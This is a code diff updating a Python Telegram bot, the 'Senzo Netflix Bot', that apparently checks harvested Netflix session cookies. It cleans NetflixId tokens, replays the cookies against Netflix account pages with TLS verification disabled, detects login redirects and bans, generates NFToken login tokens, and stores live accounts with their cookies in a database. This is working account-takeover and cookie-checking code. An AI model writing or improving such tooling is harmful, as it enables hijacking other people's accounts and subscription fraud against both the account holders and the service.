+        # Check if extra member
+        if is_extra_member_account(info):
+            return "extra_member_premium", "Premium (Extra Member)"
         
         # Check plan aliases
         for key, aliases in NetflixService.PLAN_ALIASES.items():
@@ -930,8 +1053,8 @@ class NetflixService:
     
     @staticmethod
     def generate_nftoken(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
-        """Generate NFToken from NetflixId."""
-        if not netflix_id:
+        """Generate NFToken from NetflixId with retry logic."""
+        if not netflix_id or len(netflix_id) < 20:
             return None, None
         
         query_params = {
@@ -985,7 +1108,7 @@ class NetflixService:
             "x-netflix.request.client.timezoneid": "Asia/Dhaka",
         }
         
-        for attempt in range(attempts):
+        for attempt in range(max(1, attempts)):
             try:
                 headers_copy = dict(headers)
                 headers_copy["Cookie"] = f"NetflixId={netflix_id}"
@@ -1023,45 +1146,47 @@ class NetflixService:
     
     @staticmethod
     def check_account(cookies_dict: Dict) -> Dict:
-        """Enhanced account checker with advanced parsing and fallback."""
+        """Enhanced account checker with aggressive cleaning and retry logic."""
         if not cookies_dict:
             return {"valid": False, "error": "No cookies"}
         
-        # Try to find any usable token
+        # Extract and clean NetflixId
         netflix_id = decode_netflix_value(cookies_dict.get("NetflixId", ""))
         
         # If no NetflixId, try to find any long string in the dict
-        if not netflix_id or len(netflix_id) < 20:
+        if not netflix_id or len(netflix_id) < 30:
             for key, value in cookies_dict.items():
                 if isinstance(value, str) and len(value) > 50:
-                    # Check if it looks like a token (base64-like)
                     cleaned_value = decode_netflix_value(value)
-                    if cleaned_value and re.match(r'^[A-Za-z0-9+/=]+$', cleaned_value[:50]):
-                        netflix_id = cleaned_value
-                        logger.info(f"Using fallback token from {key}")
-                        break
+                    if cleaned_value and len(cleaned_value) > 30:
+                        # Check if it looks like a valid token
+                        if re.match(r'^[A-Za-z0-9+/=]+$', cleaned_value[:50]) or cleaned_value.startswith("ct="):
+                            netflix_id = cleaned_value
+                            logger.info(f"Using fallback token from {key}")
+                            break
         
-        if not netflix_id or len(netflix_id) < 20:
-            return {"valid": False, "error": "No usable token found"}
+        # Final aggressive cleaning
+        if netflix_id:
+            if netflix_id.startswith("ct="):
+                netflix_id = netflix_id[3:]
+            if "&" in netflix_id:
+                netflix_id = netflix_id.split("&")[0]
+            if "%26" in netflix_id:
+                netflix_id = netflix_id.split("%26")[0]
+            if "?" in netflix_id:
+                netflix_id = netflix_id.split("?")[0]
+            try:
+                netflix_id = unquote(netflix_id)
+            except Exception:
+                pass
+        
+        if not netflix_id or len(netflix_id) < 30:
+            return {"valid": False, "error": "No usable token found (minimum length 30 chars)"}
         
         session = None
         try:
             session = requests.Session()
-            for name, value in cookies_dict.items():
-                cleaned_value = decode_netflix_value(value)
-                if not cleaned_value:
-                    continue
-                if name == "NetflixId":
-                    session.cookies.set(name, netflix_id, domain=".netflix.com", path="/")
-                elif name == "SecureNetflixId":
-                    session.cookies.set(name, cleaned_value, domain=".netflix.com", path="/", secure=True)
-                else:
-                    try:
-                        session.cookies.set(name, cleaned_value, domain=".netflix.com", path="/")
-                    except Exception:
-                        pass
-            
-            headers = {
+            session.headers.update({
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.9",
@@ -1069,7 +1194,22 @@ class NetflixService:
                 "Connection": "keep-alive",
                 "Upgrade-Insecure-Requests": "1",
                 "Cache-Control": "max-age=0",
-            }
+            })
+            
+            # Set all cookies
+            for name, value in cookies_dict.items():
+                cleaned_value = decode_netflix_value(value)
+                if not cleaned_value:
+                    continue
+                try:
+                    if name == "NetflixId":
+                        session.cookies.set(name, netflix_id, domain=".netflix.com", path="/")
+                    elif name == "SecureNetflixId":
+                        session.cookies.set(name, cleaned_value, domain=".netflix.com", path="/", secure=True)
+                    else:
+                        session.cookies.set(name, cleaned_value, domain=".netflix.com", path="/")
+                except Exception:
+                    pass
             
             urls = [
                 "https://www.netflix.com/account/membership",
@@ -1078,27 +1218,27 @@ class NetflixService:
             ]
             
             last_error = None
+            retry_count = max(1, MAX_RETRIES)
             
-            for attempt in range(MAX_RETRIES):
+            for attempt in range(retry_count):
                 for url in urls:
                     try:
                         response = session.get(
                             url,
-                            headers=headers,
                             timeout=CHECK_TIMEOUT,
                             verify=False,
                             allow_redirects=True
                         )
                         
-                        # CRITICAL: Check if we got redirected to login
+                        # Check if redirected to login
                         if "login" in response.url.lower() or "signin" in response.url.lower():
-                            continue
+                            return {"valid": False, "error": "Redirected to login - cookie expired or invalid"}
                         
                         if response.status_code == 200:
                             text = response.text
                             
                             # Check if it's a real account page
-                            account_indicators = ["account", "membership", "profile", "browse", "Your Account"]
+                            account_indicators = ["account", "membership", "profile", "browse", "Your Account", "netflix"]
                             if any(indicator in text.lower() for indicator in account_indicators):
                                 info = NetflixService.parse_account_page(text)
                                 is_subscribed = NetflixService.is_subscribed(info)
@@ -1122,9 +1262,9 @@ class NetflixService:
                                     "nftoken_expiry": nftoken_expiry,
                                 }
                         elif response.status_code == 403:
-                            continue
+                            return {"valid": False, "error": "HTTP 403 Forbidden - account locked or banned"}
                         elif response.status_code == 429:
-                            time.sleep(1)
+                            time.sleep(2)
                             continue
                             
                     except requests.exceptions.Timeout:
@@ -1137,8 +1277,8 @@ class NetflixService:
                         last_error = str(e)
                         continue
                 
-                if attempt < MAX_RETRIES - 1:
-                    time.sleep(0.5)
+                if attempt < retry_count - 1:
+                    time.sleep(1)
             
             return {"valid": False, "error": last_error or "Could not validate account"}
             
@@ -1153,7 +1293,7 @@ class NetflixService:
                     pass
 
 # ============================================================
-# TURSO CURSOR WRAPPER FOR UNIFIED API
+# TURSO CURSOR WRAPPER
 # ============================================================
 
 class TursoCursorWrapper:
@@ -1207,7 +1347,7 @@ class TursoCursorWrapper:
         return r
 
 # ============================================================
-# DATABASE MANAGER - WITH BULLETPROOF TURSO & SQLITE DUAL SUPPORT
+# DATABASE MANAGER
 # ============================================================
 
 class DatabaseManager:
@@ -1467,7 +1607,6 @@ class DatabaseManager:
                 self._init_sqlite_meta_tables()
     
     def _init_sqlite_meta_tables(self):
-        """User/report/channel tables in SQLite when Turso is not configured."""
         if not self.sqlite_conn:
             return
         with self._sqlite_lock:
@@ -1657,7 +1796,7 @@ def health_check():
         return jsonify({
             "status": "online",
             "service": "Senzo Netflix Bot",
-            "version": "5.0.0",
+            "version": "6.0.0",
             "bot_token_configured": bot_configured,
             "accounts_db": DATABASE_PATH,
             "database": db_status,
@@ -1668,7 +1807,7 @@ def health_check():
         return jsonify({
             "status": "online",
             "service": "Senzo Netflix Bot",
-            "version": "5.0.0",
+            "version": "6.0.0",
             "error": str(e)[:50],
             "timestamp": datetime.utcnow().isoformat()
         }), 200
@@ -2047,7 +2186,6 @@ class AccountRepository:
                 logger.info(f"⏭️ Skipping duplicate: {email}")
                 return False
             
-            # Ensure cookies field is a string, not a dict
             cookies_value = account_data.get("cookies", "")
             if isinstance(cookies_value, dict):
                 cookies_value = NetflixService.get_cookie_text(cookies_value)
@@ -3543,7 +3681,7 @@ class BotHandlers:
 
 def main():
     print("=" * 70)
-    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION v5.0")
+    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION v6.0")
     print("🔥 Merged with Advanced Cookie Extraction Engine")
     print("=" * 70)
     if not ADMIN_IDS:
